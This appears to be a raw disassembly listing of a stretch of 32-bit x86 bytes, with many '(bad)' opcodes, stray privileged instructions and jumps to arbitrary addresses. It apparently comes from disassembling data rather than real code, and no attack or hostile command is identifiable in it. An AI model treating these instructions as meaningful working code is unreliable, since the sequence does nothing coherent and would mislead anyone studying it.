  41621a:	xor    al,0x31
  41621c:	or     BYTE PTR [edx+0x78],dl
  41621f:	addr16 xchg ecx,eax
  416221:	test   al,0x6d
  416223:	in     eax,0x6
  416225:	cmc    
  416226:	popf   
  416227:	xor    DWORD PTR [edx-0x23],0xffffffd5
  41622b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41622c:	imul   ebx,DWORD PTR ds:0x17babab8,0x5c
  416233:	inc    esp
  416234:	pop    esp
  416235:	stos   BYTE PTR es:[edi],al
  416236:	ins    DWORD PTR es:[edi],dx
  416237:	inc    eax
  416238:	dec    ebx
  416239:	inc    esp
  41623a:	popf   
  41623b:	or     dl,BYTE PTR [esi]
  41623d:	push   es
  41623e:	mov    edi,0x9dc73c07
  416243:	push   ds
  416244:	adc    eax,DWORD PTR [edi+0x4d09c1a]
  41624a:	int3   
  41624b:	jge    0x416238
  41624d:	cmp    BYTE PTR [ecx],dh
  41624f:	mov    ah,0x88
  416251:	jge    0x4162b4
  416253:	mov    esi,0x475e4cfc
  416258:	jl     0x416206
  41625a:	imul   esp,DWORD PTR gs:[eax+0x4d],0xffffffd1
  41625f:	ret    
  416260:	dec    DWORD PTR [esi-0x6]
  416263:	ret    0x3601
  416266:	call   0x9935:0x35a68cfb
  41626d:	cli    
  41626e:	ss mov bh,0x5a
  416271:	stos   DWORD PTR es:[edi],eax
  416272:	xchg   ebx,eax
  416273:	jo     0x416242
  416275:	or     ebp,0xe
  416278:	rcr    bl,1
  41627a:	ja     0x4162ab
  41627c:	and    DWORD PTR [bp-0x78da],esp
  416281:	hlt    
  416282:	mov    ebp,0x19f07755
  416287:	dec    eax
  416288:	add    ch,BYTE PTR [esp+edx*4-0x26]
  41628c:	sub    eax,0x8928526e
  416291:	dec    esp
  416292:	stos   DWORD PTR es:[edi],eax
  416293:	stos   DWORD PTR es:[edi],eax
  416294:	cld    
  416295:	sbb    ebx,DWORD PTR [ecx]
  416297:	es popf 
  416299:	ss dec edx
  41629b:	dec    ecx
  41629c:	dec    edx
  41629d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41629e:	mov    bl,0xa0
  4162a0:	sbb    BYTE PTR [ebp-0x5f],0xd6
  4162a4:	jecxz  0x41623a
  4162a6:	sub    ebx,ecx
  4162a8:	mov    ebp,0x853e7898
  4162ad:	outs   dx,DWORD PTR ds:[esi]
  4162ae:	addr16 out dx,al
  4162b0:	out    0x76,eax
  4162b2:	daa    
  4162b3:	repz cmp ch,BYTE PTR [ecx]
  4162b6:	xchg   ebx,eax
  4162b7:	adc    BYTE PTR [ebp-0x763fb470],0x59
  4162be:	and    al,BYTE PTR [esi+ecx*2]
  4162c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162c2:	loop   0x4162ae
  4162c4:	test   al,0xc2
  4162c6:	and    edx,DWORD PTR [ebp-0x58]
  4162c9:	xchg   edx,eax
  4162ca:	lods   eax,DWORD PTR ds:[esi]
  4162cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162cc:	sub    al,0x52
  4162ce:	cmc    
  4162cf:	mov    edi,0x5b56cc6e
  4162d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162d5:	pop    esp
  4162d6:	(bad)  
  4162d7:	pop    ss
  4162d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162d9:	std    
  4162da:	sti    
  4162db:	cmp    eax,0x8d2ed1
  4162e0:	xor    ecx,ebx
  4162e2:	ds je  0x41634f
  4162e5:	push   ebp
  4162e6:	inc    eax
  4162e7:	push   es
  4162e8:	and    al,0x7f
  4162ea:	xchg   al,ch
  4162ec:	dec    eax
  4162ed:	cli    
  4162ee:	mov    ebp,0x9b2c8b90
  4162f3:	mov    ch,0x17
  4162f5:	cmp    al,0x3e
  4162f7:	fiadd  WORD PTR [ebx-0x12]
  4162fa:	stos   DWORD PTR es:[edi],eax
  4162fb:	add    BYTE PTR [esi+ebx*1+0x36],ah
  4162ff:	je     0x4162c3
  416301:	sub    eax,0x554e0898
  416306:	daa    
  416307:	mov    ebx,0x59dac6c8
  41630c:	ret    0xfcbc
  41630f:	xchg   esp,eax
  416310:	stc    
  416311:	js     0x41633e
  416313:	fmul   st(4),st
  416315:	xchg   ebp,eax
  416316:	lods   eax,DWORD PTR ds:[esi]
  416317:	(bad)  
  416318:	imul   ebp,DWORD PTR [eax],0x9e04ce12
  41631e:	push   ebx
  41631f:	lahf   
  416320:	or     eax,0x866a97a9
  416325:	lods   eax,DWORD PTR ds:[esi]
  416326:	adc    ebp,ecx
  416328:	pop    ebp
  416329:	mov    edi,0xd96e831e
  41632e:	mov    ecx,0xab56dcd8
  416333:	push   0xffffffcc
  416335:	retf   
  416336:	stos   DWORD PTR es:[edi],eax
  416337:	adc    al,0x36
  416339:	fs iret 
  41633b:	(bad)  
  41633d:	cmp    al,0xd
  41633f:	call   0x799828
  416344:	les    edx,FWORD PTR [eax+0x58]
  416347:	inc    edx
  416348:	fmul   DWORD PTR [esp-0x4a]
  41634c:	(bad)  
  41634e:	mov    bl,0x1
  416350:	adc    al,0xb4
  416352:	xchg   ecx,eax
  416353:	gs pop es
  416355:	mov    ah,0x59
  416357:	add    ebx,DWORD PTR [eax+eax*1-0x9]
  41635b:	lock dec edx
  41635d:	pmaxub mm2,QWORD PTR ds:0x1bd9cfc9
  416364:	mov    edi,0x7090219a
  416369:	rcl    bl,cl
  41636b:	call   eax
  41636d:	jns    0x41635a
  41636f:	and    ch,ch
  416371:	stc    
  416372:	out    dx,eax
  416373:	ds dec edi
  416375:	lock mov ds,WORD PTR [ebp+0x4d3ad45f]
  41637c:	inc    ecx
  41637d:	sar    DWORD PTR [edx],1
  41637f:	sbb    eax,DWORD PTR [ebx]
  416381:	xor    DWORD PTR cs:[edi+0x34],0x5d
  416386:	push   ss
  416387:	mov    eax,0x33b7fb26
  41638c:	inc    esp
  41638d:	in     al,0x86
  41638f:	inc    DWORD PTR [esi]
  416391:	mov    DWORD PTR [ecx+0x78219b9d],esp
  416397:	call   0xdee70792
  41639c:	mov    edi,0x4104f16a
  4163a1:	lods   eax,DWORD PTR ds:[esi]
  4163a2:	push   edx
  4163a3:	cwde   
  4163a4:	dec    edx
  4163a5:	(bad)  
  4163a6:	jne    0x41636c
  4163a8:	cmp    eax,0x2c7e5e55
  4163ad:	loop   0x4163a9
  4163af:	inc    esi
  4163b0:	je     0x4163a7
  4163b2:	xor    al,0xf9
  4163b4:	stc    
  4163b5:	cmp    eax,0x9f5e90fb
  4163ba:	and    ch,cl
  4163bc:	aad    0xc7
  4163be:	push   ds
  4163bf:	cmc    
  4163c0:	mov    ds:0x2b67ce63,eax
  4163c5:	xchg   edi,eax
  4163c6:	mov    WORD PTR [esi],ss
  4163c8:	nop
  4163c9:	lea    esi,[edi-0x14c34e3c]
  4163cf:	and    eax,DWORD PTR [ecx-0x28]
  4163d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163d3:	sub    BYTE PTR [ebx],bl
  4163d5:	add    al,BYTE PTR [edx-0x1f]
  4163d8:	fiadd  DWORD PTR [ecx+0x48432904]
  4163de:	ja     0x416413
  4163e0:	mov    eax,0x57117817
  4163e5:	test   al,0x16
  4163e7:	inc    ebx
  4163e8:	jns    0x416447
  4163ea:	idiv   DWORD PTR [edx+edx*4]
  4163ed:	mov    esp,0x7d6514fe
  4163f2:	shl    DWORD PTR [ebx],0xd2
  4163f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163f6:	cmp    esp,DWORD PTR [ebp+0x5a9a7604]
  4163fc:	and    cl,dh
  4163fe:	mov    ch,0xa1
  416400:	shld   esp,ecx,cl
  416403:	dec    esp
  416404:	sub    esp,ebx
  416406:	add    bh,BYTE PTR [esi+0x1239100]
  41640c:	adc    edx,DWORD PTR [ecx+eiz*4]
  41640f:	adc    BYTE PTR [esi+ebx*4+0x2be57674],dl
  416416:	mov    edx,0x626d5d0
  41641b:	cs xor al,0xb3
  41641e:	inc    esp
  41641f:	clc    
  416420:	fst    QWORD PTR [ebp-0x74]
  416423:	sbb    al,cl
  416425:	imul   DWORD PTR [edi-0x73b319e6]
  41642b:	mov    esp,0xa0f85555
  416430:	pop    edi
  416431:	pop    ebp
  416432:	add    ah,BYTE PTR [ebx]
  416434:	jmp    0x4163b8
  416436:	xchg   DWORD PTR [edx+0x4a],ecx
  416439:	lea    eax,[ecx-0x5c]
  41643c:	test   eax,0xe19f072d
  416441:	push   esi
  416442:	arpl   di,dx
  416444:	dec    ecx
  416445:	fbstp  TBYTE PTR [edi+ecx*4+0x6b8a1603]
  41644c:	xchg   edx,eax
  41644d:	inc    ecx
  41644e:	mov    edi,0x1448016c
  416453:	adc    edi,edx
  416455:	jo     0x4163d8
  416457:	cmp    al,0xa9
  416459:	nop
  41645a:	mov    fs,esi
  41645c:	jl     0x416490
  41645e:	cmp    eax,0x60d3e788
  416463:	stos   DWORD PTR es:[edi],eax
  416464:	cld    
  416465:	dec    edi
  416466:	jno    0x416470
  416468:	aad    0x1
  41646a:	(bad)  
  41646b:	pop    edx
  41646c:	push   edx
  41646d:	das    
  41646e:	arpl   bp,ax
  416470:	(bad)  
  416471:	push   esi
  416472:	mov    ecx,0x6c6f97b3
  416477:	sar    DWORD PTR [ecx],cl
  416479:	cwde   
  41647a:	xchg   esp,eax
  41647b:	ficomp DWORD PTR [ebp-0x4f]
  41647e:	sbb    al,0xe9
  416480:	mov    ah,0x5c
  416482:	mov    ds:0x5f747424,eax
  416487:	push   esi
  416488:	mov    esi,0x7f5672ec
  41648d:	cli    
  41648e:	int3   
  41648f:	and    al,0xdf
  416491:	adc    ch,ch
  416493:	pop    es
  416494:	push   ecx
  416495:	or     al,0x27
	...
  416513:	add    BYTE PTR ds:0xfe3de0ab,dl
  416519:	jg     0x4164f8
  41651b:	stos   DWORD PTR es:[edi],eax
  41651c:	mov    esi,DWORD PTR [edi+0x6b9cd01b]
  416522:	sar    BYTE PTR [eax],cl
  416524:	pop    ebx
  416525:	or     DWORD PTR [ecx],eax
  416527:	add    BYTE PTR [ebx+0x7],ch
  41652a:	add    BYTE PTR [eax],al
  41652c:	cdq    
  41652d:	or     ebx,ebp
  41652f:	and    DWORD PTR [ebx-0x34],edi
  416532:	xchg   edi,eax
  416533:	addr16 dec ebx
  416535:	jp     0x4164f9
  416537:	fst    QWORD PTR [edi+0x73]
  41653a:	mov    ds:0xa320c03f,eax
  41653f:	mov    esp,0xf89eb8fb
  416544:	jg     0x4165a4
  416546:	sub    edx,DWORD PTR [esi-0x1e]
  416549:	mov    al,dh
  41654b:	mov    edi,0x8f179561
  416550:	iret   
  416551:	pusha  
  416552:	jecxz  0x4164d7
  416554:	dec    esp
  416555:	scas   eax,DWORD PTR es:[edi]
  416556:	scas   al,BYTE PTR es:[edi]
  416557:	mov    al,0x8c
  416559:	popa   
  41655a:	mov    ebx,0x166cbda1
  41655f:	(bad)
  416563:	ror    DWORD PTR [ebp-0x7ac408a6],1
  416569:	xlat   BYTE PTR ds:[ebx]
  41656a:	dec    esi
  41656b:	push   es
  41656c:	xor    BYTE PTR [esi-0x531e7d3e],bh
  416572:	dec    ebx
  416573:	shl    BYTE PTR [eax+0x5aa958c0],0x12
  41657a:	and    eax,0x7903946
  41657f:	fsubr  QWORD PTR [eax+0x9bd5518]
  416585:	jecxz  0x416520
  416587:	mov    edx,0x241986d6
  41658c:	lea    edi,[ecx+0x7b8f4eba]
  416592:	cdq    
  416593:	rcl    DWORD PTR [ecx+ebx*4-0x1a],0x27
  416598:	es loopne 0x4165ec
  41659b:	ja     0x4165fb
  41659d:	mov    ebp,0x9b4cfe3
  4165a2:	imul   ebp,edi,0xffffffae
  4165a5:	daa    
  4165a6:	xchg   ebp,eax
  4165a7:	cwde   
  4165a8:	xor    BYTE PTR [ebp-0x20d66540],bh
  4165ae:	xchg   ebx,eax
  4165af:	push   esp
  4165b0:	out    0xa,eax
  4165b2:	lea    edi,[ebp-0x62]
  4165b5:	inc    edx
  4165b6:	retf   
  4165b7:	add    ecx,esp
  4165b9:	mov    BYTE PTR [ebx-0xd],ah
  4165bc:	push   ebp
  4165bd:	or     DWORD PTR [esi+0x22],esp
  4165c0:	sub    DWORD PTR [ebx+eax*2-0x127ec70a],ebp
  4165c7:	mov    eax,0x13be3b70
  4165cc:	(bad)  
  4165cd:	in     eax,dx
  4165ce:	and    DWORD PTR ds:0xe837c22b,ecx
  4165d4:	xchg   BYTE PTR ds:0xdff2888e,al
  4165da:	ja     0x416651
  4165dc:	adc    dl,bl
  4165de:	add    esi,DWORD PTR [eax+0x71ecee7f]
  4165e4:	dec    eax
  4165e5:	stc    
  4165e6:	inc    edi
  4165e7:	mov    bh,0x17
  4165e9:	jl     0x416624
  4165eb:	shl    DWORD PTR [esi-0x1f8d6d27],1
  4165f1:	pusha  
  4165f2:	sbb    DWORD PTR [ebp-0x54f50bcd],esp
  4165f8:	ins    DWORD PTR es:[edi],dx
  4165f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165fa:	inc    DWORD PTR [ecx-0x7e4a3625]
  416600:	sub    eax,0xfa02b90a
  416605:	lods   al,BYTE PTR ds:[esi]
  416606:	cdq    
  416607:	sub    bl,BYTE PTR [edi+0xb]
  41660a:	hlt    
  41660b:	(bad)  
  41660c:	test   al,0xda
  41660e:	mov    ebp,0x84957d8c
  416613:	xor    dl,BYTE PTR [esi-0x45714086]
  416619:	xchg   DWORD PTR ds:0xf9d8d8a7,ebp
  41661f:	ins    DWORD PTR es:[edi],dx
  416620:	adc    BYTE PTR [eax],bh
  416622:	jne    0x416611
  416624:	add    bl,BYTE PTR [ebp-0x53041349]
  41662a:	lock sub eax,0xed14c4b5
  416630:	bswap  edi
  416632:	les    ecx,FWORD PTR [ecx]
  416634:	mov    WORD PTR [ecx+0x6ad47ca9],?
  41663a:	aam    0x3
  41663c:	push   es
  41663d:	jns    0x416699
  41663f:	and    ah,BYTE PTR [edi]
  416641:	sbb    ah,BYTE PTR [edx]
  416643:	or     ecx,ecx
  416645:	cwde   
  416646:	stos   BYTE PTR es:[edi],al
  416647:	jb     0x416698
  416649:	cmp    ebx,DWORD PTR [ecx]
  41664b:	sbb    ebp,ecx
  41664d:	stc    
  41664e:	aas    
  41664f:	mov    bh,0x88
  416651:	ficomp WORD PTR [edi]
  416653:	cmp    DWORD PTR [ecx],ecx
  416655:	push   eax
  416656:	scas   al,BYTE PTR es:[edi]
  416657:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416658:	leave  
  416659:	push   eax
  41665a:	stc    
  41665b:	add    eax,eax
  41665d:	jno    0x4166bf
  41665f:	(bad)  
  416661:	out    0xbe,al
  416663:	mov    dh,ah
  416665:	mov    dh,0x22
  416667:	pop    ecx
  416668:	ror    DWORD PTR [ebx+edx*8+0xc],0x44
  41666d:	clc    
  41666e:	and    bh,BYTE PTR [ebp+0xc3cf3d1]
  416674:	pusha  
  416675:	mov    ecx,DWORD PTR [eax-0x4464a25f]
  41667b:	test   DWORD PTR [ebx],0x75e6f715
  416681:	jl     0x4166dc
  416683:	out    dx,al
  416684:	push   ebp
  416685:	push   ebp
  416686:	push   ecx
  416687:	jg     0x41660b
  416689:	xchg   ebx,eax
  41668a:	jl     0x41669b
  41668c:	out    0xab,al
  41668e:	xlat   BYTE PTR ds:[ebx]
  41668f:	ins    BYTE PTR es:[edi],dx
  416690:	push   ebp
  416691:	xor    BYTE PTR [ebx],bh
  416693:	sti    
  416694:	push   eax
  416695:	mov    bh,0xb7
  416697:	pop    ebp
  416698:	mov    WORD PTR [eax-0x62],ss
  41669b:	dec    edx
  41669c:	xchg   edx,eax
  41669d:	lods   al,BYTE PTR ds:[esi]
  41669e:	in     al,0x8d
  4166a0:	mov    fs,WORD PTR [eax+0x10]
  4166a3:	imul   ebp,DWORD PTR [edx],0x2bf8a7fd
  4166a9:	sub    dh,bl
  4166ab:	les    esp,FWORD PTR [ecx-0x7b88af2a]
  4166b1:	xor    edx,esi
  4166b3:	adc    BYTE PTR fs:[ecx],0x44
  4166b7:	xlat   BYTE PTR ds:[ebx]
  4166b8:	jo     0x4166e6
  4166ba:	push   eax
  4166bb:	sub    BYTE PTR [esi+0x64],0xcc
  4166bf:	ds ret 0x8c60
  4166c3:	and    eax,0x43b983f4
  4166c8:	fisttp WORD PTR [ebp+0x50]
  4166cb:	lahf   
  4166cc:	stos   BYTE PTR es:[edi],al
  4166cd:	add    ah,BYTE PTR [edx-0x6d0de60]
  4166d3:	sub    BYTE PTR [ebx],bh
  4166d5:	cld    
  4166d6:	pop    esi
  4166d7:	mov    ds:0x84936c4a,eax
  4166dc:	cmc    
  4166dd:	test   BYTE PTR [edi-0x319354fb],ch
  4166e3:	mov    edx,0x98d69c16
  4166e8:	ja     0x41670a
  4166ea:	pop    ebx
  4166eb:	je     0x416758
  4166ed:	mov    ch,0x7f
  4166ef:	cmp    BYTE PTR [ebx-0x56a69a9],bh
  4166f5:	in     al,dx
  4166f6:	inc    ecx
  4166f7:	ret    0xf7bb
  4166fa:	lods   al,BYTE PTR ds:[esi]
  4166fb:	test   al,0x85
  4166fd:	push   es
  4166fe:	cmc    
  4166ff:	sub    al,0xb5
  416701:	adc    BYTE PTR [edx],al
  416703:	fwait
  416704:	out    dx,al
  416705:	sub    al,0x26
  416707:	call   0xb6f5fdc6
  41670c:	mov    al,0x9
  41670e:	imul   ecx,esi,0x3
  416711:	pop    ss
  416712:	scas   eax,DWORD PTR es:[edi]
  416713:	push   esp
  416714:	push   eax
  416715:	push   esi
  416716:	stos   DWORD PTR es:[edi],eax
  416717:	pop    eax
  416718:	and    ecx,DWORD PTR [esi]
  41671a:	sub    eax,0xa9ec79ab
  41671f:	or     BYTE PTR [eax],bh
  416721:	sub    bl,dl
  416723:	(bad)  
  416724:	(bad)  
  416725:	clc    
  416726:	adc    al,0x6
  416728:	lds    ebp,FWORD PTR [edx]
  41672a:	sbb    BYTE PTR [ecx-0x28ec41f3],0x2a
  416731:	mov    dh,0xea
  416733:	outs   dx,BYTE PTR ds:[esi]
  416734:	call   0xec6a2067
  416739:	cmp    eax,DWORD PTR [edx-0x40]
  41673c:	or     bh,ah
  41673e:	fs loopne 0x416716
  416741:	jo     0x416705
  416743:	loope  0x416798
  416745:	out    dx,al
  416746:	or     eax,0x8a544129
  41674b:	retf   0x649a
  41674e:	jg     0x416799
  416750:	js     0x416765
  416752:	jnp    0x4166eb
  416754:	pop    es
  416755:	inc    ebx
  416756:	mov    dh,BYTE PTR [edx+0x78]
  416759:	repnz dec eax
  41675b:	gs aam 0xf
  41675e:	aam    0xc5
  416760:	jmp    0x4166ef
  416762:	ret    
  416763:	jmp    0x63c1eae0
  416768:	repnz ftst 
  41676b:	leave  
  41676c:	mov    bl,0x4c
  41676e:	repz test DWORD PTR [ecx],esp
  416771:	sbb    BYTE PTR [esi+esi*2-0x61c24c61],dl
  416778:	sub    edi,DWORD PTR [ebx+0x1cf47137]
  41677e:	and    eax,0x3ad31230
  416783:	cmp    eax,0x7cf3efde
  416788:	mov    WORD PTR [ecx],cs
  41678a:	inc    esp
  41678b:	mov    ebx,0x1e29feb5
  416790:	jg     0x4167d4
  416792:	fwait
  416793:	mov    dl,0x6b
  416795:	lods   eax,DWORD PTR ds:[esi]
  416796:	or     BYTE PTR [ebx+ebx*2],al
  416799:	cwde   
  41679a:	(bad)  
  41679b:	xor    eax,0x981d7f6d
  4167a0:	test   DWORD PTR [eax-0x1c],ebx
  4167a3:	xor    esi,DWORD PTR [ecx+esi*1-0x1b30bc38]
  4167aa:	or     eax,edi
  4167ac:	retf   0xe095
  4167af:	div    DWORD PTR [esi-0x12ba94f3]
  4167b5:	dec    esp
  4167b6:	sub    DWORD PTR [eax+0x2c0b3695],edx
  4167bc:	mov    esp,0x6986991d
  4167c1:	std    
  4167c2:	and    BYTE PTR [ebx],bl
  4167c4:	jns    0x4167b6
  4167c6:	pop    ebp
  4167c7:	daa    
  4167c8:	xchg   DWORD PTR [edi-0x1b],ecx
  4167cb:	mov    ch,0x8
  4167cd:	je     0x41684d
  4167cf:	sub    BYTE PTR [ebx],al
  4167d1:	pop    ss
  4167d2:	xchg   ebp,eax
  4167d3:	popf   
  4167d4:	(bad)  
  4167d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167d6:	pusha  
  4167d7:	inc    ecx
  4167d8:	ret    0xf800
  4167db:	adc    al,0x1d
  4167dd:	xor    BYTE PTR [edx+0x3c76b855],dh
  4167e3:	popa   
  4167e4:	adc    BYTE PTR [esi],ch
  4167e6:	mov    DWORD PTR [eax-0x24c2f22a],0xa22bcfdf
  4167f0:	rol    BYTE PTR [ebp-0x6437ab69],1
  4167f6:	div    BYTE PTR [eax+ebp*4+0x29]
  4167fa:	mov    cs,WORD PTR [ebx+0x6509e984]
  416800:	pop    ds
  416801:	in     eax,0xe2
  416803:	dec    esi
  416804:	pop    ss
  416805:	cmp    DWORD PTR [ebx+esi*2+0x66],ebx
  416809:	mov    DWORD PTR [eax],ebp
  41680b:	dec    ecx
  41680c:	test   DWORD PTR [ecx-0x3fcd0cb9],ecx
  416812:	nop
  416813:	pop    ebx
  416814:	test   al,0x4e
  416816:	inc    eax
  416817:	mov    WORD PTR [ebx-0x5f2f8ed3],?
  41681d:	push   es
  41681e:	clc    
  41681f:	inc    ebx
  416820:	mov    DWORD PTR [ebx-0x5c],esp
  416823:	sub    eax,0x66bc7fc0
  416828:	xlat   BYTE PTR ds:[ebx]
  416829:	pop    ds
  41682a:	cld    
  41682b:	popa   
  41682c:	(bad)  
  41682d:	jmp    0x41684a
  41682f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416830:	(bad)  
  416831:	stos   DWORD PTR es:[edi],eax
  416832:	xor    eax,0x2908b1ee
  416837:	adc    al,0x17
  416839:	push   edx
  41683a:	inc    ecx
  41683b:	out    dx,al
  41683c:	(bad)  
  41683d:	jno    0x41686b
  41683f:	jb     0x4167df
  416841:	daa    
  416842:	add    ecx,DWORD PTR [ebp-0x69]
  416845:	pop    es
  416846:	or     bl,bh
  416848:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416849:	and    esi,DWORD PTR [edi-0x4]
  41684c:	sbb    al,0x8f
  41684e:	cli    
  41684f:	fidiv  WORD PTR [edx]
  416851:	aaa    
  416852:	jg     0x416843
  416854:	popf   
  416855:	dec    ebp
  416856:	cmp    eax,0x773f6c1
  41685b:	mov    ds:0x5eecada4,al
  416860:	aaa    
  416861:	(bad)  
  416862:	sbb    edx,eax
  416864:	jbe    0x416813
  416866:	sbb    esi,eax
  416868:	fs int3 
  41686a:	xlat   BYTE PTR ds:[ebx]
  41686b:	mov    WORD PTR [edx+0x79da9645],cs
  416871:	and    ecx,edi
  416873:	in     al,0x18
  416875:	scas   eax,DWORD PTR es:[edi]
  416876:	(bad)  
  416877:	and    ebx,esi
  416879:	adc    cl,BYTE PTR [ecx-0x3110a5d5]
  41687f:	adc    al,0x5
  416881:	pop    es
  416882:	xchg   edx,eax
  416883:	out    0xd3,al
  416885:	test   BYTE PTR [ebx-0x30880fbe],ah
  41688b:	cmp    ebx,edx
  41688d:	xchg   edi,eax
  41688e:	cmp    DWORD PTR [edx-0x7d045997],0x40
  416895:	mov    WORD PTR [ebp-0xf],gs
  416898:	loope  0x416892
  41689a:	aas    
  41689b:	out    dx,al
  41689c:	mov    ecx,0xe94918a6
  4168a1:	imul   DWORD PTR [esp+edi*2+0x25]
  4168a5:	call   0x5028:0x35667978
  4168ac:	fwait
  4168ad:	ins    DWORD PTR es:[edi],dx
  4168ae:	(bad)  
  4168af:	shl    DWORD PTR [ebx-0x3c],1
  4168b2:	mov    ds,WORD PTR [edi+0x12de75a7]
  4168b8:	jge    0x4168c6
  4168ba:	stos   DWORD PTR es:[edi],eax
  4168bb:	mov    ch,0x43
  4168bd:	inc    edx
  4168be:	pop    ss
  4168bf:	jmp    0x4168b7
  4168c1:	xchg   BYTE PTR [eax+0x2704f695],al
  4168c7:	pop    ebx
  4168c8:	mov    ecx,DWORD PTR [ebp+0x5c]
  4168cb:	inc    eax
  4168cc:	in     al,0x4f
  4168ce:	pop    edx
  4168cf:	or     dl,BYTE PTR [ebx-0x672f9acf]
  4168d5:	(bad)  
  4168d6:	out    0x1a,eax
  4168d8:	inc    esp
  4168d9:	adc    DWORD PTR [edx-0x5068cb09],0x4c6599ca
  4168e3:	call   0xa63f:0xb5959eaf
  4168ea:	iret   
  4168eb:	call   0x474e:0x787e778
  4168f2:	cld    
  4168f3:	jp     0x4168d0
  4168f5:	repnz sbb ecx,DWORD PTR [ecx+ebp*2+0x25f7fd6f]
  4168fd:	popf   
  4168fe:	dec    ebp
  4168ff:	inc    esi
  416900:	mov    WORD PTR ss:[eax-0x27],ss
  416904:	in     al,0x83
  416906:	call   0xf9e3:0x5ffe4fec
  41690d:	fsubr  QWORD PTR [eax+0x29]
  416910:	lea    edx,[edi+0x7f]
  416913:	push   edx
  416914:	dec    eax
  416915:	js     0x4168d1
  416917:	xor    eax,0xc80517da
  41691c:	pop    eax
  41691d:	adc    eax,0x56095a1a
  416922:	adc    ebp,DWORD PTR [ebx]
  416924:	xor    BYTE PTR [eax],bh
  416926:	rcl    DWORD PTR [edi],cl
  416928:	arpl   WORD PTR [edi-0x6],bx
  41692b:	imul   ebp,DWORD PTR [edi-0x23],0x11
  41692f:	clc    
  416930:	push   ecx
  416931:	xchg   edx,eax
  416932:	das    
  416933:	or     ah,dh
  416935:	mov    ah,0x63
  416937:	cmp    BYTE PTR [esi-0xb],ch
  41693a:	jge    0x41694f
  41693c:	pop    ebx
  41693d:	push   ss
  41693e:	cdq    
  41693f:	xor    esp,edi
  416941:	pop    es
  416942:	mov    esp,0x6ed6fbda
  416947:	sar    DWORD PTR [ecx+0x4543f94e],0x86
  41694e:	mov    esi,0xe581cff1
  416953:	pop    eax
  416954:	jmp    0x4169be
  416956:	dec    esi
  416957:	xor    al,ah
  416959:	int3   
  41695a:	inc    eax
  41695b:	ins    DWORD PTR es:[edi],dx
  41695c:	pop    esi
  41695d:	jno    0x41693b
  41695f:	test   DWORD PTR [edi-0x29f0e79e],ecx
  416965:	cmp    DWORD PTR [ebp+0x5],ebx
  416968:	hlt    
  416969:	jne    0x41698b
  41696b:	cs daa 
  41696d:	xchg   DWORD PTR [ebp+0x4cf3b0e8],edx
  416973:	jg     0x41695b
  416975:	lds    edi,FWORD PTR [ebp+edx*2-0x49]
  416979:	ins    DWORD PTR es:[edi],dx
  41697a:	test   DWORD PTR [ebx-0x62],0x6fd9c014
  416981:	mov    ecx,0x6a4491f4
  416986:	inc    ecx
  416987:	pop    ecx
  416988:	xchg   edx,eax
  416989:	xchg   esp,eax
  41698a:	popa   
  41698b:	mov    eax,0xcef8b036
  416990:	popw   ss
  416992:	mov    dl,0x51
  416994:	add    dl,BYTE PTR [eax+0x4b7a06f5]
  41699a:	mov    eax,fs:0xc49a1d59
  4169a0:	icebp  
  4169a1:	aam    0xf
  4169a3:	iret   
  4169a4:	xor    dh,bh
  4169a6:	add    eax,0x93a28263
  4169ab:	mov    BYTE PTR [edx],ch
  4169ad:	ss repz loope 0x4169f5
  4169b1:	retf   
  4169b2:	(bad)  
  4169b3:	push   ebx
  4169b4:	jae    0x416949
  4169b6:	fstp   QWORD PTR [ecx-0x40]
  4169b9:	in     al,0x37
  4169bb:	inc    eax
  4169bc:	inc    BYTE PTR [ebp+0x4293e4cd]
  4169c2:	cmp    DWORD PTR [edi-0xa],ecx
  4169c5:	retf   0xd31b
  4169c8:	or     eax,0x64c52cd9
  4169cd:	(bad)
  4169d0:	repnz cmp bl,BYTE PTR [edx+esi*8+0x39]
  4169d5:	int3   
  4169d6:	sbb    al,0x98
  4169d8:	inc    ecx
  4169d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169da:	sub    DWORD PTR [ebp-0x7fb0643e],ebp
  4169e0:	test   BYTE PTR [ebx+ecx*8+0x19],0xb0
  4169e5:	inc    al
  4169e7:	sahf   
  4169e8:	sti    
  4169e9:	and    BYTE PTR ds:[ebx+0x63],dh
  4169ed:	inc    esp
  4169ee:	jmp    0x55c9c659
  4169f3:	cld    
  4169f4:	jb     0x416a4e
  4169f6:	xor    dl,BYTE PTR [edx-0x22104bfe]
  4169fc:	push   ss
  4169fd:	loop   0x4169dd
  4169ff:	and    BYTE PTR [ebx+esi*1+0x4ed8dea8],dh
  416a06:	mov    cl,0x38
  416a08:	inc    ecx
  416a09:	xor    DWORD PTR [esi-0x5b],0xf64509bd
  416a10:	fdiv   QWORD PTR [ecx]
  416a12:	mov    ebp,0x2dd3242e
  416a17:	xor    eax,0x30a09a4
  416a1c:	sti    
  416a1d:	push   ebp
  416a1e:	and    bh,bh
  416a20:	adc    DWORD PTR [eax+0x78],0xffffffff
  416a24:	pusha  
  416a25:	pop    eax
  416a26:	out    dx,al
  416a27:	mov    BYTE PTR [esi-0x3a],ah
  416a2a:	fwait
  416a2b:	inc    eax
  416a2c:	pop    edi
  416a2d:	mov    eax,ds:0xfbf20efb
  416a32:	adc    eax,0xc734d8f8
  416a37:	inc    edx
  416a38:	mov    ebp,0x7d89ac74
  416a3d:	(bad)  
  416a3e:	mov    eax,ds:0x1b61d28a
  416a43:	mov    ds:0xcd56e843,al
  416a48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a49:	pushf  
  416a4a:	adc    dl,cl
  416a4c:	lea    ebx,[eax+edi*4-0x32]
  416a50:	mov    edi,0x7dc1ed1a
  416a55:	sub    DWORD PTR ss:[ebx-0x7cc28e6c],0x6552ef7a
  416a60:	jae    0x416a0f
